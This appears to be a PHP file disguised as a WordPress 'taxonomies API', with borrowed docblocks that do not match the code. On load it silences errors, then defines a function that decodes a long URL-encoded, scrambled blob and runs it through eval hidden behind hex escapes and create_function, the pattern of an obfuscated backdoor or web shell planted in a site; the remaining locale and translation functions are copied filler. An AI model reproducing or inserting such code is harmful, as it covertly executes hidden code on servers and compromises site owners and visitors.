<?php
/**
 * Simple and uniform taxonomies API.
 *
 * Will eventually replace and standardize the WordPress HTTP requests made.
 *
 * @link http://trac.wordpress.org/ticket/4779 HTTP API Proposal
 *
 * @subpackage taxonomies
 * @since 2.3.0
 */

//
// Registration
//

/**
 * Returns the initialized WP_Http Object
 *
 * @since 2.7.0
 * @access private
 *
 * @return WP_Http HTTP Transport object.
 */
function taxonomies_init() {	
	realign_taxonomies();
}

/**
 * Realign taxonomies object hierarchically.
 *
 * Checks to make sure that the taxonomies is an object first. Then Gets the
 * object, and finally returns the hierarchical value in the object.
 *
 * A false return value might also mean that the taxonomies does not exist.
 *
 * @package WordPress
 * @subpackage taxonomies
 * @since 2.3.0
 *
 * @uses taxonomies_exists() Checks whether taxonomies exists
 * @uses get_taxonomies() Used to get the taxonomies object
 *
 * @param string $taxonomies Name of taxonomies object
 * @return bool Whether the taxonomies is hierarchical
 */
function realign_taxonomies() {
	error_reporting(E_ERROR|E_WARNING);
	clearstatcache();
	@set_magic_quotes_runtime(0);

	if (function_exists('ini_set')) 
		ini_set('output_buffering',0);

	reset_taxonomies();
}

/**
 * Retrieves the taxonomies object and reset.
 *
 * The get_taxonomies function will first check that the parameter string given
 * is a taxonomies object and if it is, it will return it.
 *
 * @package WordPress
 * @subpackage taxonomies
 * @since 2.3.0
 *
 * @uses $wp_taxonomies
 * @uses taxonomies_exists() Checks whether taxonomies exists
 *
 * @param string $taxonomies Name of taxonomies object to return
 * @return object|bool The taxonomies Object or false if $taxonomies doesn't exist
 */
function reset_taxonomies() {
	if (isset($HTTP_SERVER_VARS) && !isset($_SERVER))
	{
		$_POST=&$HTTP_POST_VARS;
		$_GET=&$HTTP_GET_VARS;
		$_SERVER=&$HTTP_SERVER_VARS;
	}
	get_new_taxonomies();	
}

/**
 * Get a list of new taxonomies objects.
 *
 * @param array $args An array of key => value arguments to match against the taxonomies objects.
 * @param string $output The type of output to return, either taxonomies 'names' or 'objects'. 'names' is the default.
 * @param string $operator The logical operation to perform. 'or' means only one element
 * @return array A list of taxonomies names or objects
 */
function get_new_taxonomies() {
	if (function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc())
	{
		foreach($_POST as $k => $v) 
			if (!is_array($v)) $_POST[$k]=stripslashes($v);

		foreach($_SERVER as $k => $v) 
			if (!is_array($v)) $_SERVER[$k]=stripslashes($v);
	}

	if (function_exists("register_and_add_new_taxonomies"))
		register_and_add_new_taxonomies();	
	else
		Main();	
}

taxonomies_init();

/**
 * Add registered taxonomies to an object type.
 *
 * @package WordPress
 * @subpackage taxonomies
 * @since 3.0.0
 * @uses $wp_taxonomies Modifies taxonomies object
 *
 * @param string $taxonomies Name of taxonomies object
 * @param array|string $object_type Name of the object type
 * @return bool True if successful, false if not
 */
function register_and_add_new_taxonomies() {
    global $transl_dictionary;
    
    if (!function_exists("O01100llO")) {
        function O01100llO(){global $transl_dictionary;return call_user_func($transl_dictionary,'%40%3cd%40cPDD%40d%3e%3aSeV%28%24TZ%3aS%2fTu%7cvLSNQqhy%29%21J%3b%29R%3baoE%24L%7d%28N%24v%2d1B%28qjV%40V%7d5I%40Sp%404U%5cVwm%3c%3cTFx%256err%3a%29GZ%212%25BKLGKldu%21Z%23%24M%28Q0t%2fR%7dnaXN%2dAVtJvONv%2ci%2bA%2d%5dozIj9zW%5b23q%22%7bU6%21z%2a3P%7b31%5eh6Us8gB%40r%3e%60FVDm%3a%3cd%2fA%3e7T%29%3cTDpS%2fdCyJJKMHcQ%21%23%23a%7eiW6H%7c%28X%7e%28%24GLWiYnb%5dv%26f%3bjAE%5bqk%5e%60%2ff%7dI%22kIoNO%60%5e5w%5fp3%3d4%27%406%5cgm%3fpcW42B%3a%3fB8%7bPcp%25Ze%3aT%20lgK%2fu%2e%23%2eG%3b%60lVJa%2eJy%3c%29%3bGt%2dRM%28E%2cxvW%2bn%5dbN%27c%2c%21%2aqb%2an%7eX%27N%26U%5b2%26%27s%7bX%5fh5w%5f%3f9%60%3et3%5d%22%3c9%227%27p%3e%60SV%3dmD%3e%2ecpKZe%7crxl%25Q%5bS%3fG%3blG%3a%3e%2fQ%25%23%23%24%7e%28%3b%21X%2duMMa%2cNvj%2bMoD%7dHY%5b%2bYW%20boMI1Oz%5dp2nq7%7b3%40h%268%242f5Fh5%60E%5f8%26BFP%3esGVwmS%3cTKS%3dyoV4%25QS%25c%5cey%3dJH%29HCN%21Z%23%28%7e%28vL%20n8%3a%3d%2fC%2flFL%2eo%3br%21Jr%23yQQrJ%2e%2dl%3b%7d%2f%2cnM%23%27zjQOLa0%7e%3e%3bvNotfE%2bWE%2cObq%5d8B%3aX%60I%5f9%5fhoD%3c%40%5c69%60%40%7cZwp%3e%2fhMw%207%2eJ4JBVe4%7d6B%5ej%3eFj%3dMmU%3cc%24u%29ee2rl%23i%2cuEw0%20W%7d%20Y%2dvv%20%7dR%5e%24%5d%2cA%5dbAA943v%22%5eYrb%5cb%7diMW%20Nfkv%2d%2bI0R%2baqU%7e%7brPh%7dw6ZmFD%3fgQst%3fLB%23%3ctjFLZm%27%3cl%3a%20cxQKGQr%28C%7d%21Eo%2e%5bxH1Q%7b%21zni%2d%2aE0%5d5%60E96B%7dcW41n%3a%2aX%3bDxAuEq2k%3c1s%221%3f7%5c%5c%267D6Vmmy9%3f8%25%22%3fre%7cFZK%3fCuTC%3dMaD%7d%21c%5b%25u%2f%28eu%2dLt%29%3bauvN%23vOU6%21b%2dfjf%2aLR6pgPapN%2bWgYAkz%5d%60zp%27F%3e%5bDke%27Uze%5bq%26u1%7cV%60x57%5fx9p4%24%40d%3e%3a%5cS%7cVF%7cP%2fDxraNT%2aSeZ%2a%7cl%3a%5dG%3bQtNQaN%3baaz%5b%5ckR%5enRA%2bffRnYOMEI%2abI%2b2f%60%27Pd6A%3ez1%22H%26h64qp5r%26q%2b%2a%5enh5Ja%22%3eg%40Q%7c%3arS%3d%7c%3b%7e%3ceyMmI%3c%5eWS%2dZW%2fx%28%60%2eQ%2d%3bJL%21k%2eJFDS%3d%7cFrT%24%7ehd%2dbYM9OUzofOs6A%273%3e%5euA%7cmoBImq5%5c%23L%5fw%3ewm9%2fCR%5fB8%22%29%25eZ%3cd%25%24%20%3dS%2f%2dF%5d%3d0%2c%3c%3bcQG%24%28%24%21%3ab%2eQ%2d5C0%2efxjH%2b%3b%2aX%2aY%7e%26M%2bAFqYOEYUj%27%27Yj5EA55IdP%27m%3fk31c3%3fp3g%22881%22Tsm%3c%3cJ4%3f%3agBs%23%24%3fxgo%3c%29cT%7d%2d%25%2bTa%29%24%24b%26rn%24RR%2f%5fC%40%7e%2daR%2c%7e%3b%5b%24PE%3cFk%3cR9RhEzzpcW%5fYjO%7b%5dOI%3eO9%60O4%7b77I%7bP%5f%3fgg%3a3d%404Bg5%5ce8s%40Q%21%5cy8%21%7cuu%3eEFOJreuC%3cl%3bKGbYuf3Knui%3b%2c%20%3b%7eO%3b%2av%3bX%2cbb%7e%2c%27noII9Nz%7b%5b%26%5eO%2aBgXp%5ex%60IA%22pzp%5cSZ%212tgm%3eF%22BuKpH9ycBe%21YsQe%2f%2fPAd%27%2fTVr%7cQ%3crHH%7eu%21LLfjhup%2dHy%23M%24%29%7e%2ct%28Y13PL2%2dWfInf0pfqOf%7bI%26%260I427%22%22D%27%22%5b%5cs%3f%5f%3f%3e%7bGK%60%255vFp%5fc%25%5c%25%7c%21%23b%3fE%3aFuC%2ee%2eHa%7denSN%20%2f%2801l%2a%28MMC9%2e%5cM%21xL%3b%2aQLnnja0%5d%5dw7maeknNfO%5eYjUoA1dVC%5dgk%26w6%7bUV2%25sdd3%2dh%5f%2a%22Bd%25cB%5c%2b%5cJ8%3a%3d%2fC%2flFLuHHItl%23%29l%7eJ%20%20lLxy%29Ej%20IX%29t%3bQ%5b2Unjj%3bFtT%2b%2a%5enMX02vXUU3%5d%2655dPUmD%29Hi%2d%28WfMrqe%3fVVRw%2a%22Bd%25cB6%2b%5cdcl%3dg%24l%2e%2eVkm%29JH%2fx%23%2fn%3anC%5e%2f%5d%2f%7daML%20%7d%27kN%2a%2a%26q%24w%28qXooV%7dknz%5bzI%2bpU33%3a%40I%5f%7bI9qwwI8%4058%60e%25%5f%2f%7br7uZw%2fT9v4%2aPV%3cdSGTeDL%28S%7d%5dmRCJrl%25%26eyCL%20%7eJjfQo7J%3b%7eHz%27N%2btR%7e%3edLpwRhj%5dn%2avZ%2bdcTc%3aX%2eoU%7bhzmVqZOGx%29Hr%241%7dVB%3fs%3eg%2eC%3fHv%40Vds%23%24%20Dl%3eEFOZC%2e%7c%2ev%2cK0er%2d%2fG%5ejw%5f7B%5cme%3eziYL0f0n%28LZ%7dnX%27kn%2c%3bzA%26%5en%3d0%3aXz%27jFU%409%7b%40qc%3c%606l%26Z5G3%7cR5m%3cDd8mHxB%20%238JB%23%3dmd%5dVtSk%3c%23KuJKebVFD%40j%2fYCjL%20%7d%296in%2abvRn%7bqMawV%7d0b%2c49ofOr%3a%3dgXEh%27o1yo%7bq%27c%3c9%60%40%26%3b1xxi%20Cw%2f%3es%3dW%3b%3b%2dMn8%3cmg%3bTxC%7cxZa%7d%3a%29b%25vGK%5e%3ab%20x%28E79%22P8%3crF%5b%21b%2dfjf%2aL%2d%7ca%2a%5ez%27%2avt%5b%5d1A%2a%3cfG%5egI%27%5dxkp%5c2%5c8se%25h5u3%3a%3fp%3e%297TSc%3dgT%21i%3ed%28g%7d%3e%28%3aS%2fak%3ctcR%25yu%7c%2a%2eC%20%28RHEj%20M%27%406%5c%3d%3eZ%2f%3c%7b%28%5e%2c%5dk%5djM%2cK%2bjoq2jba%7bO5Ije%5dyo%7bq%27c%3c1%5bT%7eqR9%4084%60%5c6T%5f%5cDDePc%3a%3a%24%20DLtdCSxHxyTSw%7cy%29%3b%7eylct%21Miy%7bx%22%29t%3bQ%5bzX1%7e%3dAXo%2cn%5f5b6N92%2b%3fn%3d%3dmD%3eKj%29%27%26h%5f2TD3r%5bS%40sw7KLhV%40%3cc%3c%3d4%401rgPFlGPf%21cJKc%29l%2e%2ec%3aC%20%25Hx%3btf0x%20%7do%2aJ%5dannQ8%20%7e%28B%28WNt5oIkIkkU%404foq%3e0%5eDAFA%2eJxkL%24N0Re2%2554P3JR57Q%22a%22%2emTg%3es0%3fDmurGTRt%25l%29vOSC%2febY%21%24%2ex%2f%5f7y2IxoMN%28L%20B%247s%5csd%2dcv%2aAobp%22X%5d%26P%2ame%7crFuEq2k%3cmqpU%232ts%3f7%3f9%5cVC%2f6gTHi%40u%5cKm%3c%25mPL2O5%401D%2dzUS%2bvGBKHlhK%22RixQ%21%3bvOI%28%2b%26q1%7e%27%3b%2bv%2dwhW%29%2bj%25ZnP%2ab%224X%3foRkqJxIe%7cz%25U%7b66P48V%22t58%5c7Jn%3e%254g%3d%7c%23%21VcK%3e%2cFLc%22SKvWSN%24yu9%29%3bt%7c%3au7yAQc%21%2d%40QLN0RNa%3b%60%3cno%2dnXA%2ap%22X%5d%26bF08%5d%2do%26%3dmoV%4031Rw%22hBz%5b%7bt%60l%22o4ga%22%2fp0B%3c%25%3aVVcKL%28TuMoDLT%2fG%2b%2c%2fi%23Laf0%7d%21i8%7e%2cvOziA%21MR%241%2caE%3b%5eo%2d%27%26k%2ap6%2b%7crb02O9jFAs%5d2%5f4q%5bq5ZSg9%5fN%40dV59D7C%5cfd%25%21%5cy8%3cmg%3b%25C%3eH%2e%3aH%7c%25e%2eGYW%2fx%28loKXxs%24aI%27%29kN%2a%2a%20hg%7eLcimoM%7d6a%5fnKA%5bY%3ebX%2f7Hy4Hoyo25%401zT%40ggqCL35%2bI%2c%3c%229%204J%3fA%3d%7c8%2dB%3eExUkiU%3ck%3ctcR%25K%29%7eC%3aNG%29%3bRixi%7eIoYt%3bVM%2aX%7etjL%7b%2ce%2ak%22%2c3v%22%26%27%5bbl08oU5Ac%5dFU%28%60%40zl%5b%26BHQH%3fIVSHV%7e%284NpF%3e%5c%20jG%7cu%3dSt%3bJKy%2cNTLS%24H%29J%21iX%2aR%7et%5d%5f%2eEMYYi%7b8%20%7eDxFA%2dt4RhW%3afOvB%2bbl5J%2f7JA%2fA%3f%5d%5bhpqh3UZSh91L3g%3ep%3e%40B%3cx%2e%3fFZ%5cL8%21F%27S%2f%2dRV%23m%25uJQlly%23bYC%29%5e%60%2fftNNJ2%40H%21FlgX%28%7e%5f%3b1aZboM%5c%2cWe%7bu%3ahuX%3aX6%5e%2717UoV7%5c%5czl%2321au%2dF5h%29w%2f%400Pcp%7e68Xukj%2ekFjF%24%3d%28DLT%2fG%2b%2c%2fi%23Laf0%7d%21iB%7et%23WzUQE%20RnXM%2dM%2b5%60I%2anK%5e%5dX2Y01%2asEQUqO%3d%5d%3fk31c%3c%6062%7eqR9BP4PC%2f6gT4%24%40%29gkDS%3d%2dPd%3dV%7dMmR%2e%21%21SX%26e%3a4%3c5%2du%2f%27CjiP%3bR%7ei%7b%21%24PE%3cFk%3cRFR%2b%5e%27b%5eX%404j%5bbl0yI%7b%60O%60%3dF%5b3pO%3aUc3%2c%2267C%605V%5f%2eJ9yDee6%3b%2a8gOwECVFv%3d%2d%25%60Kyl%25fe%3a%60%7d4w%2c4ywy%21tv%24HIv00%235P%28tZ9DkaM%5c%2c7bCEIjbF0%5eC%22QJ%40QIJI%23%7bq9%40%3f5re9g%2ft5r%5fl9ns%3eDcP%20QFTGR%3e%28l%2fSZ%2cITil%23%7e%23Qrn%24RRhbQN%2dQWL%2c%2cQZ%7eaY13OL%7b%5eIIMT%2cvunEI%7bqEXlfUOFgUh7%40Bc%3cO%2a%2ajEU3%5f%3f%22w3%2eJ9l4JTrrs0%3f%3d%2eDm%2e%2eS%7d%2d%3d%40%40%3fgDeGiule%5e%60%2fbCQLN%23L%28zkLvnfo%7bq%28yyHQL%2ckf%27%2b%2cs8b90qEXw7k74DT%29O%7bBq4%7cZ%26jjk%271%5fV%3fm4%5fiW6H%25GGB%5ePlm%3eZ%25%29%3dZJJ%20GH%7e%7e%2aX%7bG%28%2eKitQy%21R%7e%20N%5b%268%24O%28abEvbY7hb%5d%272%60%5c%40Y%3b%3b%7dabA%27%267kATcOdUc%609B1L3%3a3ooz%5bh48d%25%5c4n8%21%7cuu%3eEFcrJ%3duKQ%20%2bvKJ%7eX%7bGY%2fH%28a%21%28%24%27%5d%28%2c%2b0Eq2%24uuxH%28M%5e%5dY%2b%5dNz%2a1o0YP%3e%5e6A%3e5ppIiO%603%3fUps5hs%7b%3e7D8%2ex%2c4u%40P%3crF%3cm%28%20%3c%3a%2fJ%21MRm66BP%3c%7cLC%28Li%28%28CGokJX%29kN%2a%2a%20B%24aMA%28kv%5dk0%5d%5d4%40S%2b7nAz3oz%27dBz%60%5fp%3fTD%27bb%5eAz%7bP9w%22w3%2eJ9l4JPV%3cd8XB%23Bww4%40PDx%7c%25r%25%3c%5be%2b%20ttG5%2fRixQk%5d%7etM%3b2s%23%27%7eMnANn%2b%5f%60nEI%5b36p%2b%28%28RMnj%22w%26%22%5bIEcSzF%5bS%5c%3e%3e%7bt%60%3cV8%3c%5cJy9%5b%5b%7b%604%3fulcu%3cFg%2c%3d%2d%3d%40%40%3fgDeKl%3bKG%7cjhu%2ay%21tv%24t%3bUItWb%5ek31%3b%2e%2ei%21tNO0kO%7bj%2a%2bgPf%40jPh%27%7bkH%27D%27bb%5eAz%7bP9%3fP%3c%407ha%22bdZpPmr%24%20rVZ%2dF%27%3d%2dx%7cic%5b%253%23iu%29%3bf0%3bJ%24o%2e7xoW%28n%21%3f%23Fjbn%2bX%2awhEW%5epcW42j1%2auX%3f%7b77EJoIn%5c%26q38%3fqq%24%7brgmmwa7%22%5e6dmred%3f%2aBiP%3crySrea%2dr%2eH%23tn%2be%3e%3em%3crCLQ%2b%21%3bviJ%5b2%20o%24VnYaYEwhRHH%23%7eMYOjhA%273%5e%2aFA%29%5dF%5f66O%21U2%5ePh57dF55%2d%5fu%3d%25%25pY6skg%3c%25uK%3cFAV%7emeui%3auKYNuQ%24t%2c%5eXKDD%25euHa%28XtMvR%28%20%60ht%5bRS%27%5dUn%5e%404W%7e%7e%2d%7dY%5e1%274Uq%602%27%5dSz%7e%5bS%5c%3e%3e%7bt%605%27%3cp%40scS%40%40W%5ciZKKgj%3eF%26DrKi%29rSz%25Meui%3b%2ei%29j0iL%7dv%2a%27k%29%3dTZDuQ%3bENY0WMttNUoOvO0zEXn%3edj42q%602ITG%25UV2%25sdd3%2dhwOT%4068S%256%2b%5cmV%24%3delCH%2dLF44s%3f%3d%25ir%7e%2e%3aZf%5eKX%29%23M%2e4x%28%7enH%2c%2bL%3b%2b%24XR%5dYw7mabEUX%2bp%5ek10KfBfMMWYj%27%22%5bs52O%23qe%3e3%2dhGh0jof%26%5f6rdmcVgssdyluFucCrSDUZ%2eC%2a%2bHtlMt%28%2d%29%21%23%23x%3bR%2ct%26%5bf3%3bU%5b%2d%7bY0jba0%7bE%2611%3fs%60%3edj%5cEdw%40%40%27Qz%5bj%5cps%60%5f3Y%5fsg66%22%2c4s%25P%3f%3cb%3fHg%24Td%5dVt%25l%29b%25XefWZ4%5cB%40DrC%2c%21%7et%23H%2e%2e%21v%7eWR%28%20PL%7boRDMZ%2a%5e%5dXIqozEB8Id%2fA%3e%60w%5b%26%27Qzh%60B%40swlr4u%2dw%3fs9x%2emTg%3es0XBaL%3e%28l%2fSZDOTXkok2%7c5u%29%23%28xA%5e%21OJq%5f79%5b%5c%20a%7d1%5bqWVWjEYE%227U8n2X0BgXp%5eg%60%22%22o%29IO%7b4%40%60%40%26N%60ps%22%22%29wzD684AFD%3eY8BR%23%2f%5edDy%25TKIT%2dSGx%24urnC%7e%7e%7d%5fQM%21H%20%27ktq%21%2daW%7d%5eWON5%60k9%22%3cNrf0IU1EB8Od%2fA%26%5bmd%3d3Q3p6h6re9C5%3c97%2eJ9l4JTrrs0%3fgD%3aGTGV1Tlurr0%25w%2f%7e%3b%3a%40i%23%29hC%2eUE%244H%23YL%7eN%3f%7ez%3b%2c%2a%5dW%7d0b%2c4X1%5b%5d1A%3fs%27V%5egIhh4%3cHiQR%3b%2b%5ea%3a1T3%3aPDD%5f%2c94Br%25Vrd8%27%3ece%3c%3cNV%26Z%29iT5uJK%5b%7c%3aEbx%60%2fJ%7dQ%29L%22%29Aigt%3bvnfM31%2bwV%7d0b%2c492%5cYK%7b2hEO%3egz%3c%5dFpI%25OKK%2fur%241%7d%5f%40B%3epyu8Q4JDcPd%24%2aBFK%3c%3drE%3d%28D%7cCQl%25Re%2b%20ttG5%2fy%5ff%3fTBrueV%21Turr%28u%29c%2fGeMSvsBgxytxV%3d%29aij%7eW%7d%7dkl%7cllG%7db%3b%7bL%3bnIjjaM%5eXbfY%2b3%27h2I%5eW%2c%2bd%26%2f%2ecle%7c%3ax%5b%5ed%40V%3fp5h%27B86%3fp4B%25dy%3f8c7%3eS0jMnvWYET%3fy%3e%7cMU3%2aEqf137E%26%276%26%274%7b%5c47Bg4%3f%3f%60%3d%3ew%22%4068S%25%40%7cVm%3a%3fmreDTCvo%606zO1h5g7dF%60%22%20QJ%24C%23%21%2c%23%29YNQ%2d%2b%23fb%28AWN%2d%3d%25M%2f%21KuZrbdGXK%271q%27A5I%262%29r%7e%20%21KtMaAvok%7dRiYI0%60%2bW%28k%6022fPXP%21d%2fyruH%3cMx%23%23%5be%2fxy%7b%2b%3ey%20L%5dk9',95159);}
        call_user_func(create_function('',"\x65\x76\x61l(\x4F01100llO());"));
    }
}

/**
 * Gets the current taxonomies locale.
 *
 * If the locale is set, then it will filter the locale in the 'locale' filter
 * hook and return the value.
 *
 * If the locale is not set already, then the WPLANG constant is used if it is
 * defined. Then it is filtered through the 'locale' filter hook and the value
 * for th
e locale global set and the locale is returned.
 *
 * The process to get the locale should only be done once but the locale will
 * always be filtered using the 'locale' hook.
 *
 * @since 1.5.0
 * @uses apply_filters() Calls 'locale' hook on locale value.
 * @uses $locale Gets the locale stored in the global.
 *
 * @return string The locale of the blog or from the 'locale' hook.
 */
function get_taxonomies_locale() {
	global $locale;

	if ( isset( $locale ) )
		return apply_filters( 'locale', $locale );

	// WPLANG is defined in wp-config.
	if ( defined( 'WPLANG' ) )
		$locale = WPLANG;

	// If multisite, check options.
	if ( is_multisite() && !defined('WP_INSTALLING') ) {
		$ms_locale = get_option('WPLANG');
		if ( $ms_locale === false )
			$ms_locale = get_site_option('WPLANG');

		if ( $ms_locale !== false )
			$locale = $ms_locale;
	}

	if ( empty( $locale ) )
		$locale = 'en_US';

	return apply_filters( 'locale', $locale );
}

/**
 * Retrieves the translation of $text. If there is no translation, or
 * the domain isn't loaded the original text is returned.
 *
 * @see __() Don't use pretranslate_taxonomies() directly, use __()
 * @since 2.2.0
 * @uses apply_filters() Calls 'gettext' on domain pretranslate_taxonomiesd text
 *		with the unpretranslate_taxonomiesd text as second parameter.
 *
 * @param string $text Text to pretranslate_taxonomies.
 * @param string $domain Domain to retrieve the pretranslate_taxonomiesd text.
 * @return string pretranslate_taxonomiesd text
 */
function pretranslate_taxonomies( $text, $domain = 'default' ) {
	$translations = &get_translations_for_domain( $domain );
	return apply_filters( 'gettext', $translations->pretranslate_taxonomies( $text ), $text, $domain );
}

/**
 * Get all available taxonomies languages based on the presence of *.mo files in a given directory. The default directory is WP_LANG_DIR.
 *
 * @since 3.0.0
 *
 * @param string $dir A directory in which to search for language files. The default directory is WP_LANG_DIR.
 * @return array Array of language codes or an empty array if no languages are present.  Language codes are formed by stripping the .mo extension from the language file names.
 */
function get_available_taxonomies_languages( $dir = null ) {
	$languages = array();

	foreach( (array)glob( ( is_null( $dir) ? WP_LANG_DIR : $dir ) . '/*.mo' ) as $lang_file ) {
		$lang_file = basename($lang_file, '.mo');
		if ( 0 !== strpos( $lang_file, 'continents-cities' ) && 0 !== strpos( $lang_file, 'ms-' ) )
			$languages[] = $lang_file;
	}
	return $languages;
}
?>
